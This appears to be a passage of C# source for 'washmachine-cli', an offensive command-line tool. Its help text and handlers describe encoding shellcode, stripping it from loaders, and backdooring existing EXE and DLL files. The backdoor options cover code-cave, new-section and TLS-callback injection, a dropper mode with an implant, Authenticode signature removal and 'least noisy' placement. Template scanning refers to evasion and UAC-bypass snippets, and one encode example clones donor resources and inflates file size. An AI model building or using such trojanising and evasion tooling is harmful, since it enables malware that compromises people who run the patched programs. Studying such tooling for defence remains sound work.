                new UsageExample("washmachine-cli encode -s payload.bin -CloneFrom donor.exe -NoCloneIcon -PadNops 1048576", "Finalize the output by cloning donor resources and inflating size.", "Any shell"),
            ],
            Related:
            [
                new UsageNote("show templates", "See which playbook templates are available before choosing -t."),
                new UsageNote("show modules", "Inspect section names and snippet IDs used by --snippet."),
                new UsageNote("show encoders", "Inspect the live Bin2Shell encoder and envelope catalog."),
                new UsageNote("provision", "Pre-download Bin2Shell if you want tooling ready before your first encode run."),
            ]);

    private static CommandUsage BuildAnalyzeUsage() =>
        new(
            Name: "analyze",
            Summary: "Inspect a PE file before stripping, patching, or troubleshooting it.",
            Syntax: "washmachine-cli analyze <pe-file> [options]",
            Description: "Shows the structural view of a PE so you can pick safer injection and extraction strategies.",
            WhenToUse: "Use it for recon before backdoor, or when you need a quick read on architecture, sections, imports, entry point, and code caves.",
            Output: "Prints a styled PE report or JSON.",
            OptionGroups:
            [
                new UsageOptionGroup(
                    "Input and output",
                    "Only the target PE is required.",
                    [
                        new UsageOption("<pe-file>  or  -Pe <file>", "Path to the PE file to inspect."),
                        new UsageOption("-Json", "Emit machine-friendly JSON instead of the styled report."),
                    ]),
            ],
            Sections:
            [
                new UsageSection(
                    "Why it matters",
                    Bullets:
                    [
                        "Use analyze first to confirm x86 vs x64 before choosing an injection method.",
                        "Code cave output helps you decide whether code-cave or text-pad injection is realistic.",
                        "The section view is also useful when picking strip modes and raw ranges.",
                    ]),
            ],
            Examples:
            [
                new UsageExample("washmachine-cli analyze .\\target.exe", "Inspect a PE interactively before patching it.", "PowerShell / pwsh"),
                new UsageExample("washmachine-cli analyze -Pe ./target.exe -Json", "Feed PE analysis into another script or tool.", "Bash / Zsh"),
            ],
            Related:
            [
                new UsageNote("backdoor", "Patch the analyzed PE once you know which injection method fits."),
                new UsageNote("strip", "Use the section and entry-point data to choose a better extraction mode."),
            ]);

    private static CommandUsage BuildBackdoorUsage() =>
        new(
            Name: "backdoor",
            Summary: "Inject a prepared flat .bin payload into an existing PE file.",
            Syntax: "washmachine-cli backdoor -Pe <file> -Shellcode <file> [options]",
            Description: "Backdoor modifies a target PE after you already know the payload bytes you want to embed.",
            WhenToUse: "Use it after analyze or strip when the goal is to patch an existing PE rather than compile a new loader.",
            Output: "Writes a patched PE. Session logs go to logging/backdoor_<timestamp>_<guid>/ unless disabled for the run.",
            OptionGroups:
            [
                new UsageOptionGroup(
                    "Required input",
                    "Both files are required for the supported workflow.",
                    [
                        new UsageOption("-Pe <file>", "Target EXE or DLL to modify."),
                        new UsageOption("-s, -Shellcode <file>", "Flat .bin payload to inject."),
                    ]),
                new UsageOptionGroup(
                    "Injection and output",
                    "Choose how the payload is placed and where the patched file lands.",
                    [
                        new UsageOption("-o, -Output <file>", "Destination path for the patched PE.", "<input>.backdoored.exe"),
                        new UsageOption("-m, -Method <method>", "Injection method used to place the payload.", "code-cave", "code-cave | new-section | section-ext | text-pad | tls-callback"),
                        new UsageOption("-SectionName <name>", "Section name used by methods that create PE section data.", ".extra"),
                        new UsageOption("-CaveMinSize <bytes>", "Minimum code-cave size when scanning for code-cave placement."),
                        new UsageOption("-DryRun", "Analyze feasibility and planned changes without writing an output file."),
                    ]),
                new UsageOptionGroup(
                    "Execution mode and implant",
                    "How the payload is invoked at runtime, and where the optional dropped implant lives.",
                    [
                        new UsageOption("-Mode <mode>", "Backdoor execution mode.", "normal", "normal | silence | dropper"),
                        new UsageOption("-Implant <file>", "Standalone implant EXE to embed when -Mode dropper is selected. Required for dropper mode."),
                    ]),
                new UsageOptionGroup(
                    "Encryption and placement",
                    "Optional payload encryption and section-placement details. Most users do not change these.",
                    [
                        new UsageOption("-Encryption <mode>", "Payload transform mode applied by the backdoor command. Encoding lives in the encode pipeline.", "none", "none"),
                        new UsageOption("-XorKey <bytes>", "Key bytes when -Encryption uses an XOR variant in future builds. Currently unused for -Encryption none."),
                        new UsageOption("-CaveMinSize <bytes>", "Minimum code-cave size when scanning for code-cave placement.", "0"),
                    ]),
                new UsageOptionGroup(
                    "Behavior, compatibility, and logging",
                    "These flags shape the patching pass and reporting.",
                    [
                        new UsageOption("-Carrier <mode>", "Payload invocation strategy. Use entry-point for EXE targets, dll-main for DLL targets (both hook the entry point).", "entry-point", "entry-point | dll-main"),
                        new UsageOption("-NoRemoveSig", "Keep the Authenticode signature instead of removing it."),
                        new UsageOption("-NoPatchSubsystem", "Leave the subsystem unchanged instead of patching to GUI."),
                        new UsageOption("-NoPreserveEntry", "Do not resume the original entry point after payload execution."),
                        new UsageOption("-NoPatchIat", "Skip IAT patching during the carrier pass."),
                        new UsageOption("-NoPatchExit", "Do not rewrite exit behavior after the payload runs."),
                        new UsageOption("-SessionLog", "Force per-run session logging on, regardless of saved app settings."),
                        new UsageOption("-NoSessionLog", "Force per-run session logging off, regardless of saved app settings."),
                        new UsageOption("-Verbose", "Show detailed discovery and patching logs."),
                        new UsageOption("-Json", "Emit machine-friendly JSON (single line) instead of the styled report. Used by the GUI."),
                    ]),
            ],
            Sections:
            [
                new UsageSection(
                    "Injection methods",
                    Description: "Pick the least noisy method that still gives you enough space for the payload.",
                    Notes:
                    [
                        new UsageNote("code-cave", "Reuses existing slack space. Stealthier, but limited by discovered cave size."),
                        new UsageNote("new-section", "Adds a new section for the payload. Predictable and roomy, but structurally obvious."),
                        new UsageNote("section-ext", "Extends the last section without adding a new header entry."),
                        new UsageNote("text-pad", "Uses the .text VirtualSize-to-RawSize gap so file size and headers stay stable when space exists."),
                        new UsageNote("tls-callback", "Creates a TLS callback so execution can happen before main. Intended for x64 targets."),
                    ]),
                new UsageSection(
                    "Current support level",
                    Bullets:
                    [
                        "The backdoor flow expects a ready-to-run flat .bin payload. Payload encoding and obfuscation happen in the encode stage (encode + bin2shell) — not here.",
                        "Both EXE and DLL targets are supported. Use -Carrier entry-point for EXE files and -Carrier dll-main for DLL files (both patch the PE entry point; for DLLs this is DllMain).",
                        "DLL targets will not have their subsystem patched to GUI — that flag is silently ignored for DLLs.",
                    ]),
            ],
            Examples:
            [
                new UsageExample("washmachine-cli backdoor", "Drop into the interactive backdoor session (no flags).", "Any shell"),
                new UsageExample("washmachine-cli backdoor -Pe .\\app.exe -s .\\payload.bin", "Patch a PE with the default code-cave strategy.", "PowerShell / pwsh"),
                new UsageExample("washmachine-cli backdoor -Pe .\\target.dll -s .\\payload.bin -Carrier dll-main -m new-section", "Backdoor a DLL by hooking its DllMain entry.", "PowerShell / pwsh"),
                new UsageExample("washmachine-cli backdoor -Pe ./target.exe -s ./payload.bin -m new-section -o ./patched.exe", "Use a new section when you want predictable capacity.", "Bash / Zsh"),
                new UsageExample("washmachine-cli backdoor -Pe target.exe -s payload.bin -m text-pad -DryRun -Verbose", "Check whether text padding is viable before writing output.", "Any shell"),
                new UsageExample("washmachine-cli backdoor -Pe host.exe -s payload.bin -Mode dropper -Implant implant.exe", "Embed a separate implant EXE that the host drops on first launch.", "Any shell"),
                new UsageExample("washmachine-cli backdoor -Pe target.exe -s payload.bin -m tls-callback", "Attempt TLS callback placement on a compatible target.", "Any shell"),
            ],
            Related:
            [
                new UsageNote("analyze <pe-file>", "Inspect sections and code caves before choosing -m."),
                new UsageNote("strip <pe-file>", "Extract bytes from a compiled loader when you want to inject that output elsewhere."),
                new UsageNote("encode", "Build the payload first if you do not already have a flat .bin."),
            ]);

    private static CommandUsage BuildStripUsage() =>
        new(
            Name: "strip",
            Summary: "Extract flat bytes from a PE so they can be inspected, reused, or re-injected.",
            Syntax: "washmachine-cli strip <pe-file>  or  strip -Pe <file> [options]",
            Description: "Strip can carve bytes from the entry-point section or from a single named section.",
            WhenToUse: "Use it to peel shellcode out of a compiled loader or to carve a known range from a PE.",
            Output: "Writes a .bin file by default, or prints a section-analysis view when -Analyze is used.",
            OptionGroups:
            [
                new UsageOptionGroup(
                    "Input and extraction target",
                    "Choose what part of the PE to extract.",
                    [
                        new UsageOption("<pe-file>  or  -Pe <file>", "PE file to strip."),
                        new UsageOption("-m, -Mode <mode>", "Extraction mode.", "ep", "ep | section"),
                        new UsageOption("-Section <name>", "Section name used when -Mode section is selected."),
                    ]),
                new UsageOptionGroup(
                    "Output and inspection",
                    "Control how the extracted bytes are written and whether analysis is shown first.",
                    [
                        new UsageOption("-o, -Output <file>", "Destination path for the extracted .bin.", "<input>.bin"),
                        new UsageOption("-NoTrim", "Keep trailing null bytes in the extracted result."),
                        new UsageOption("-Analyze", "Print section layout and entry-point context instead of extracting."),
                    ]),
            ],
            Sections:
            [
                new UsageSection(
                    "Extraction modes",
                    Notes:
                    [
                        new UsageNote("ep", "Extract from the PE entry point to the end of the containing section."),
                        new UsageNote("section", "Extract the full raw contents of one named section (use -Section .text, .rdata, etc.)."),
                    ]),
                new UsageSection(
                    "Tip",
                    Bullets:
                    [
                        "Run 'analyze <pe>' first if you don't yet know which section or offsets to target.",
                        "Inside the interactive session, type 'set SECTION' alone to list section names from the loaded PE.",
                    ]),
            ],
            Examples:
            [
                new UsageExample("washmachine-cli strip", "Drop into the interactive strip session (no flags).", "Any shell"),
                new UsageExample("washmachine-cli strip .\\loader.exe", "Extract from the entry point to the end of the containing section.", "PowerShell / pwsh"),
                new UsageExample("washmachine-cli strip ./loader.exe -m section -Section .text", "Dump one named section.", "Bash / Zsh"),
                new UsageExample("washmachine-cli strip loader.exe -Analyze", "Preview section layout without writing a .bin.", "Any shell"),
                new UsageExample("washmachine-cli strip target.exe -o stage1.bin -NoTrim", "Extract to a specific output file and keep trailing null padding.", "Any shell"),
            ],
            Related:
            [
                new UsageNote("analyze", "Use it first when you need a clearer view of sections and offsets."),
                new UsageNote("backdoor", "Inject the extracted .bin into another PE once you have the bytes you need."),
            ]);

    private static CommandUsage BuildListUsage() => BuildShowUsage();

    private static CommandUsage BuildProvisionUsage() =>
        new(
            Name: "provision",
            Summary: "Download the external tooling required for encoding features.",
            Syntax: "washmachine-cli provision [-CoreOnly]",
            Description: "Provision fetches Bin2Shell and, when requested, the optional SGN bundle into the local Tools directory next to the CLI.",
            WhenToUse: "Run it once after install, or again whenever the Tools directory is missing or incomplete.",
            Output: "Downloads archives, installs them under Tools, and refreshes local algorithm descriptions when possible.",
            OptionGroups:
            [
                new UsageOptionGroup(
                    "Scope",
                    "Provisioning always requires network access.",
                    [
                        new UsageOption("-CoreOnly", "Download only Bin2Shell and skip optional tooling."),
                    ]),
            ],
            Sections:
            [
                new UsageSection(
                    "Platform notes",
                    Notes:
                    [
                        new UsageNote("Bin2Shell", "The bundled provisioning flow is intended to make the Python-based encoding dependency available locally."),
                        new UsageNote("SGN", "The automatic optional SGN download currently targets Windows release assets. Cross-platform users should prefer -CoreOnly unless they already manage SGN separately."),
                    ]),
                new UsageSection(
                    "When it helps",
                    Bullets:
                    [
                        "Run provision before the first encode if you want a predictable offline-ready setup.",
                        "encode also provisions automatically, but provision is the cleaner way to stage dependencies up front.",
                    ]),
            ],
            Examples:
            [
                new UsageExample("washmachine-cli provision", "Download Bin2Shell and optional tooling.", "Any shell"),
                new UsageExample("washmachine-cli provision -CoreOnly", "Download only the core encoding dependency.", "Any shell"),
            ],
            Related:
            [
                new UsageNote("encode", "The command that benefits most directly from a provisioned Tools directory."),
                new UsageNote("show encoders", "Use it after provisioning to confirm the encoder catalog is now available."),
            ]);

    private static CommandUsage BuildTestUsage() =>
        new(
            Name: "test",
            Summary: "Exercise the encode pipeline across encoders, templates, and sample payloads.",
            Syntax: "washmachine-cli test [options]",
            Description: "The harness drives Bin2Shell, template rendering, compilation, and selected execution checks to catch breakage across the workflow.",
            WhenToUse: "Use it after changing templates, snippets, provisioning behavior, or compiler integration.",
            Output: "Prints structured phase results and returns a failing exit code when setup or test execution fails.",
            OptionGroups:
            [
                new UsageOptionGroup(
                    "Core options",
                    "Phase 1 and 2 require a shellcode file. Phase 3 can use the configured test-assets directory.",
                    [
                        new UsageOption("--shellcode <file>", "Base shellcode file for phases 1 and 2, and for URL-mode setup."),
                        new UsageOption("--url <payload-url>", "Optional hosted payload URL used for the URL branch of phase 1."),
                        new UsageOption("--phase <value>", "Select which test phase to run.", "all", "1 | 2 | 3 | all"),
                        new UsageOption("--test-assets <dir>", "Directory of safe shellcode test assets used by phase 3."),
                        new UsageOption("--stop-on-fail", "Abort the harness on the first failing test case."),
                    ]),
            ],
            Sections:
            [
                new UsageSection(
                    "Phases",
                    Notes:
                    [
                        new UsageNote("Phase 1", "Covers encoder, envelope, and optional web-helper combinations."),
                        new UsageNote("Phase 2", "Covers templates and snippet values using one-factor-at-a-time sampling."),
                        new UsageNote("Phase 3", "Runs the pipeline against multiple shellcode inputs from the test-assets directory."),
                    ]),
                new UsageSection(
                    "Practical tips",
                    Bullets:
                    [
                        "Use --phase 1 or --phase 2 during iteration when you do not need the full sweep.",
                        "Add --stop-on-fail when debugging a regression so the first bad case is easier to isolate.",
                        "Run help test for the high-level view, then use test --help in scripts if you only want the harness usage line.",
                    ]),
            ],
            Examples:
            [
                new UsageExample("washmachine-cli test --shellcode .\\messagebox.bin --phase all", "Run the full harness from a known-safe sample.", "PowerShell / pwsh"),
                new UsageExample("washmachine-cli test --shellcode ./messagebox.bin --phase 1 --stop-on-fail", "Focus on encoder and envelope coverage while iterating.", "Bash / Zsh"),
                new UsageExample("washmachine-cli test --shellcode messagebox.bin --url https://host/payload.bin --phase 1", "Exercise file and URL branches together for phase 1.", "Any shell"),
            ],
            Related:
            [
                new UsageNote("encode", "The test harness validates the same core encoding and compilation pipeline."),
                new UsageNote("provision", "Run it first if the harness cannot find Bin2Shell or optional tooling."),
            ]);

    private static int PrintBackdoorUsage()
    {
        UsageFormatter.Print(BuildBackdoorUsage());
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  strip
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunStripAsync(string[] args)
    {
        if (args.Length == 0)
        {
            if (!_isRepl) { PrintStripUsage(); return 1; }
            return await RunStripInteractiveSessionAsync();
        }

        if (IsHelpToken(args[0]))
        {
            PrintStripUsage();
            return 0;
        }

        string? peFile = null;
        string? outputFile = null;
        string? sectionName = null;
        bool analyze = false;
        bool noTrim = false;
        StripMode? mode = null;
        string? invalidMode = null;

        // First arg can be positional PE file (does not start with '-')
        int startIndex = 0;
        if (!args[0].StartsWith("-", StringComparison.Ordinal))
        {
            peFile = args[0];
            startIndex = 1;
        }

        for (int i = startIndex; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-Pe" or "--pe" when i + 1 < args.Length:
                    peFile = args[++i];
                    break;
                case "-o" or "-Output" or "--output":
                    if (++i < args.Length) outputFile = args[i];
                    break;
                case "-Mode" or "--mode" or "-m":
                    if (++i < args.Length)
                    {
                        var modeArg = args[i].ToLowerInvariant();
                        mode = modeArg switch
                        {
                            "ep" or "entry-point" => StripMode.EntryPointToEnd,
                            "section"             => StripMode.Section,
                            _                     => (StripMode?)null,
                        };
                        if (mode is null) invalidMode = args[i];
                    }
                    break;
                case "-Section" or "--section":
                    if (++i < args.Length) sectionName = args[i];
                    break;
                case "-Analyze" or "--analyze":
                    analyze = true;
                    break;
                case "-NoTrim" or "--no-trim":
                    noTrim = true;
                    break;
            }
        }

        if (invalidMode is not null)
        {
            WriteStatus(StatusPrefix.Failure, $"Unknown strip mode '{invalidMode}'. Expected: ep | section. Example: -Mode section -Section .text");
            return 1;
        }

        var resolvedMode = mode ?? StripMode.EntryPointToEnd;

        if (peFile is null)
        {
            WriteStatus(StatusPrefix.Failure, "No PE file specified. Pass a path positionally or use '-Pe <file>'. Example: strip .\\loader.exe");
            return 1;
        }

        if (!File.Exists(peFile))
        {
            WriteStatus(StatusPrefix.Failure, $"PE file not found: '{peFile}'. Check the path or run 'strip --help' for usage.");
            return 1;
        }

        var logger = new ConsoleLogger();
        var stripper = new PeStripService(logger);

        if (analyze)
        {
            var analysis = await stripper.AnalyzeAsync(peFile);

            AnsiConsole.Write(new Panel($"[bold {UiColors.Header}]PE Strip Analysis[/]  [grey]{Markup.Escape(peFile)}[/]")
                .BorderColor(Color.Cyan1)
                .Border(BoxBorder.Rounded));
            AnsiConsole.WriteLine();

            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Architecture:[/]  [white]{(analysis.Is64Bit ? "x64" : "x86")}[/]");
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]Entry Point:[/]   [mediumpurple1]0x{analysis.EntryPoint:X8}[/]");
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]EP Section:[/]    [white]{Markup.Escape(analysis.EntryPointSection ?? "unknown")}[/]");
            AnsiConsole.WriteLine();

            var table = new Table()
                .Border(TableBorder.Rounded)
                .BorderColor(UiColors.BoxBorderColor)
                .AddColumn(new TableColumn($"[{UiColors.Accent}]Section[/]").LeftAligned())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]RawAddr[/]").RightAligned())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]RawSize[/]").RightAligned())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]Perms[/]").Centered())
                .AddColumn(new TableColumn($"[{UiColors.Accent}]EP[/]").Centered());

            foreach (var sec in analysis.Sections)
            {
                string perms = (sec.IsReadable ? "R" : "-") + (sec.IsWritable ? "W" : "-") + (sec.IsExecutable ? "X" : "-");
                table.AddRow(
                    Markup.Escape(sec.Name),
                    $"[mediumpurple1]0x{sec.RawAddress:X8}[/]",
                    $"[mediumpurple1]0x{sec.RawSize:X8}[/]",
                    $"[white]{perms}[/]",
                    sec.ContainsEntryPoint ? "[green3_1]<<<[/]" : ""
                );
            }

            AnsiConsole.Write(table);
            return 0;
        }

        outputFile ??= Path.Combine(
            Path.GetDirectoryName(peFile) ?? ".",
            Path.GetFileNameWithoutExtension(peFile) + ".bin");

        var options = new StripOptions
        {
            InputPath = peFile,
            OutputPath = outputFile,
            Mode = resolvedMode,
            SectionName = sectionName,
            TrimTrailingZeros = !noTrim,
        };

        try
        {
            var result = await AnsiConsole.Status()
                .Spinner(Spinner.Known.Dots)
                .SpinnerStyle(Style.Parse("cyan"))
                .StartAsync("Stripping PE...", async _ => await stripper.StripAsync(options));

            foreach (var w in result.Warnings)
                AnsiConsole.MarkupLine($"    [yellow]\u26A0[/] {Markup.Escape(w)}");

            if (result.Success)
            {
                AnsiConsole.Write(new Panel(
                    $"[green3_1]Extracted {result.ExtractedSize:N0} bytes to {Markup.Escape(result.OutputPath ?? "unknown")}[/]\n" +
                    $"[grey]Original: {result.OriginalSize:N0} bytes | Trimmed: {result.TrimmedBytes:N0} bytes[/]")
                    .BorderColor(Color.Green)
                    .Border(BoxBorder.Rounded));
            }
            else
            {
                AnsiConsole.Write(new Panel($"[red]{Markup.Escape(result.Error ?? "Unknown error")}[/]")
                    .BorderColor(Color.Red)
                    .Border(BoxBorder.Rounded));
                return 1;
            }

            return 0;
        }
        catch (Exception ex)
        {
            WriteStatus(StatusPrefix.Failure, $"Strip failed: {ex.Message}");
            return 1;
        }
    }

    private static int PrintStripUsage()
    {
        UsageFormatter.Print(BuildStripUsage());
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  scan — catalog conflict scanner
    // ═══════════════════════════════════════════════════════════════════════

    private static int RunScan(string[] args)
    {
        // Allow scan --help / scan -h / etc.
        if (args.Length > 0 && IsHelpToken(args[0]))
        {
            PrintScanUsage();
            return 0;
        }

        bool jsonMode = args.Any(a => string.Equals(a, "--json", StringComparison.OrdinalIgnoreCase)
                                   || string.Equals(a, "-Json", StringComparison.Ordinal));

        var unknown = args.FirstOrDefault(a =>
            !string.Equals(a, "--json", StringComparison.OrdinalIgnoreCase) &&
            !string.Equals(a, "-Json", StringComparison.Ordinal) &&
            !IsHelpToken(a));
        if (unknown != null)
        {
            WriteStatus(StatusPrefix.Failure, $"Unknown option for scan: '{unknown}'. Only -Json is accepted. Run 'scan --help' for usage.");
            return 1;
        }

        var paths = new AppPaths();
        var catalog = new YamlCodeSnippetCatalogService(paths);
        var scanner = new TemplateScannerService(catalog);

        TemplateScanReport report;
        try
        {
            report = scanner.Scan();
        }
        catch (Exception ex)
        {
            WriteStatus(StatusPrefix.Failure, $"scan failed: {ex.Message}");
            return 1;
        }

        if (jsonMode)
        {
            var json = JsonSerializer.Serialize(new
            {
                errors = report.ErrorCount,
                warnings = report.WarningCount,
                info = report.InfoCount,
                findings = report.Findings.Select(f => new
                {
                    severity = f.Severity.ToString(),
                    code = f.Code,
                    scope = f.Scope,
                    target = f.TargetId,
                    message = f.Message,
                }),
            }, new JsonSerializerOptions { WriteIndented = true });
            AnsiConsole.WriteLine(json);
            return report.HasErrors ? 1 : 0;
        }

        if (report.Findings.Count == 0)
        {
            WriteStatus(StatusPrefix.Success, "Catalog scan clean — no conflicts detected.");
            return 0;
        }

        var table = new Table()
            .Border(TableBorder.Rounded)
            .BorderColor(UiColors.BoxBorderColor)
            .Title($"[bold {UiColors.Header}]Catalog Scan[/] [{UiColors.Muted}]({report.Findings.Count} findings)[/]")
            .AddColumn($"[{UiColors.Accent}]Severity[/]")
            .AddColumn($"[{UiColors.Accent}]Code[/]")
            .AddColumn($"[{UiColors.Accent}]Scope[/]")
            .AddColumn($"[{UiColors.Accent}]Target[/]")
            .AddColumn($"[{UiColors.Accent}]Message[/]");

        foreach (var f in report.Findings.OrderByDescending(x => x.Severity).ThenBy(x => x.Code))
        {
            string sevColor = f.Severity switch
            {
                TemplateScanSeverity.Error => UiColors.Error,
                TemplateScanSeverity.Warning => UiColors.Warning,
                _ => UiColors.Muted,
            };
            table.AddRow(
                $"[{sevColor}]{f.Severity}[/]",
                $"[{UiColors.Hex}]{Markup.Escape(f.Code)}[/]",
                $"[{UiColors.Muted}]{Markup.Escape(f.Scope)}[/]",
                $"[{UiColors.Value}]{Markup.Escape(f.TargetId)}[/]",
                $"[{UiColors.Muted}]{Markup.Escape(f.Message)}[/]");
        }

        AnsiConsole.Write(table);
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine(
            $"[{UiColors.Muted}]Summary:[/] " +
            $"[{UiColors.Error}]{report.ErrorCount} errors[/], " +
            $"[{UiColors.Warning}]{report.WarningCount} warnings[/], " +
            $"[{UiColors.Muted}]{report.InfoCount} info[/].");

        return report.HasErrors ? 1 : 0;
    }

    private static int PrintScanUsage()
    {
        UsageFormatter.Print(BuildScanUsage());
        return 0;
    }

    private static CommandUsage BuildScanUsage() =>
        new(
            Name: "scan",
            Summary: "Static-check the snippet/template catalog for unsatisfiable requires-contracts and broken placeholders.",
            Syntax: "washmachine-cli scan [-Json]",
            Description: "Cross-references every snippet's 'requires:' tokens against every template's snippet placeholders. Flags templates that expose a snippet whose dependency cannot be satisfied (e.g. an evasion snippet requiring uac_bypass in a template that has no UAC_BYPASS placeholder).",
            WhenToUse: "Run after editing the YAML playbook, especially when you add new snippets, templates, or 'requires:' tokens.",
            Output: "A findings table (Severity, Code, Scope, Target, Message). Exit code is 1 when any error is reported.",
            OptionGroups:
            [
                new UsageOptionGroup(
                    "Output",
                    "Choose between styled or machine-readable output.",
                    [
                        new UsageOption("-Json", "Emit JSON instead of the styled table."),
                    ]),
            ],
            Sections:
            [
                new UsageSection(
                    "Finding codes",
                    Notes:
                    [
                        new UsageNote("E001", "Snippet declares an unknown requires token that is not mapped to a section template."),
                        new UsageNote("E002", "Template placeholder references a snippet section that does not exist in the catalog."),
                        new UsageNote("E003", "Template exposes a snippet that requires a capability whose section template is not also exposed by the same template (e.g. evasion needing uac_bypass)."),
                        new UsageNote("W001", "Snippet declares an unknown requires token (will be ignored at compile time, reserved for future use)."),
                        new UsageNote("I001", "Section's default item id is not the conventional 'None' stub."),
                    ]),
            ],
            Examples:
            [
                new UsageExample("washmachine-cli scan", "Run the catalog scanner and print a styled findings table.", "Any shell"),
                new UsageExample("washmachine-cli scan -Json", "Emit findings as JSON for CI consumption.", "Any shell"),
            ],
            Related:
            [
                new UsageNote("show templates", "Inspect template ids before chasing E002/E003."),
                new UsageNote("show modules", "Inspect snippet sections before chasing E001/W001."),
            ]);

    // ═══════════════════════════════════════════════════════════════════════
    //  show
    // ═══════════════════════════════════════════════════════════════════════

    private static Task<int> RunListAsync(string[] args) => RunShowAsync(args);

    // ═══════════════════════════════════════════════════════════════════════
    //  provision
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunProvisionAsync(string[] args)
    {
        // Allow provision --help / provision -h / etc.
        if (args.Length > 0 && IsHelpToken(args[0]))
        {
            PrintProvisionUsage();
            return 0;
        }

        var logger = new ConsoleLogger();
        var paths = new AppPaths();
        var provisioner = new RequirementProvisioner(paths, logger);
        bool coreOnly = args.Any(a => string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase)
                                    || string.Equals(a, "-CoreOnly", StringComparison.Ordinal));
        var unknownProvisionArg = args.FirstOrDefault(a => !string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase)
                                                         && !string.Equals(a, "-CoreOnly", StringComparison.Ordinal)
                                                         && !IsHelpToken(a));
        if (unknownProvisionArg != null)
        {
            WriteStatus(StatusPrefix.Failure, $"Unknown option for provision: '{unknownProvisionArg}'. Accepted: -CoreOnly. Run 'provision --help' for usage.");
            return 1;
        }

        try
        {
            await AnsiConsole.Progress()
                .AutoClear(false)
                .HideCompleted(false)
                .Columns(new ProgressColumn[]
                {
                    new TaskDescriptionColumn(),
                    new ProgressBarColumn(),
                    new PercentageColumn(),
                    new SpinnerColumn(),
                })
                .StartAsync(async ctx =>
                {
                    var task = ctx.AddTask("Provisioning...");
                    task.IsIndeterminate = true;
                    var reporter = new SpectreProgressReporter(task);
                    await provisioner.EnsureRequirementsAsync(
                        reporter,
                        includeOptionalTools: !coreOnly);
                });

            AnsiConsole.WriteLine();
            await PrintEncoderCatalogAsync();
            return 0;
        }
        catch (Exception ex)
        {
            logger.Error($"Provisioning failed: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  encoder catalog helpers
    // ═══════════════════════════════════════════════════════════════════════

    private static bool IsProvisioned()
    {
        var paths = new AppPaths();
        return File.Exists(paths.Bin2ShellScript) && File.Exists(paths.Bin2ShellAlgos);
    }

    private static async Task PrintEncoderCatalogAsync()
    {
        var paths = new AppPaths();

        if (!IsProvisioned())
        {
            AnsiConsole.MarkupLine($"[{UiColors.Warning}]⚠ Bin2Shell is not provisioned.[/] Run [{UiColors.Accent}]provision[/] to download Bin2Shell and unlock encoders and envelopes.");
            return;
        }

        var runner = new Bin2ShellRunner(paths);
        var service = new ShellcodeEncodingCatalogService(runner, paths);

        try
        {
            var catalog = await service.GetCatalogAsync();

            if (catalog.Encoders.Count > 0)
            {
                var encTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Title($"[bold {UiColors.Header}]Encoders[/] [{UiColors.Muted}]({catalog.Encoders.Count})[/]")
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]#[/]").Width(5))
                    .AddColumn($"[{UiColors.Accent}]Name[/]")
                    .AddColumn($"[{UiColors.Accent}]Description[/]");

                foreach (var e in catalog.Encoders)
                    encTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(encTable);
            }

            if (catalog.Envelopes.Count > 0)
            {
                AnsiConsole.WriteLine();
                var envTable = new Table()
                    .Border(TableBorder.Rounded)
                    .BorderColor(UiColors.BoxBorderColor)
                    .Title($"[bold {UiColors.Header}]Envelopes[/] [{UiColors.Muted}]({catalog.Envelopes.Count})[/]")
                    .AddColumn(new TableColumn($"[{UiColors.Accent}]#[/]").Width(5))
                    .AddColumn($"[{UiColors.Accent}]Name[/]")
                    .AddColumn($"[{UiColors.Accent}]Description[/]");

                foreach (var e in catalog.Envelopes)
                    envTable.AddRow($"[{UiColors.Hex}]{e.Index}[/]", $"[{UiColors.Value}]{Markup.Escape(e.Name)}[/]", $"[{UiColors.Muted}]{Markup.Escape(e.Description)}[/]");

                AnsiConsole.Write(envTable);
            }
        }
        catch (Exception ex)
        {
            AnsiConsole.MarkupLine($"[{UiColors.Warning}]⚠ Could not load encoding catalog: {Markup.Escape(ex.Message)}[/]");
        }
    }

    private static int PrintEncodeUsage()
    {
        UsageFormatter.Print(BuildEncodeUsage());
        return 0;
    }

    private static int PrintAnalyzeUsage()
    {
        UsageFormatter.Print(BuildAnalyzeUsage());
        return 0;
    }

    private static int PrintListUsage() => PrintShowUsage();

    private static int PrintProvisionUsage()
    {
        UsageFormatter.Print(BuildProvisionUsage());
        return 0;
    }

    private static int PrintTestUsage()
    {
        UsageFormatter.Print(BuildTestUsage());
        return 0;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  help
    // ═══════════════════════════════════════════════════════════════════════

    private static int PrintUsage()
    {
        var commands = GetHelpCatalog();
        int nameWidth = commands.Max(c => c.Name.Length);

        // Overview
        UsageFormatter.PrintSectionHeader("Overview");
        AnsiConsole.MarkupLine($"  [{UiColors.Value}]Command guide for washmachine-cli v{Ui.Banner.AppVersion}.[/]");
        AnsiConsole.MarkupLine($"  [{UiColors.Label}]Usage[/]   [{UiColors.Accent}]washmachine-cli <command> [[options]][/]");
        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Run[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]or[/] [{UiColors.Accent}]<command> --help[/] [{UiColors.Muted}]for details on any command.[/]");

        // Modes — explains one-liner vs interactive at a glance
        UsageFormatter.PrintSectionHeader("Modes");
        var modeNotes = new (string label, string desc)[]
        {
            ("One-liner",   "Provide a command and all flags on the command line. The CLI runs once and exits."),
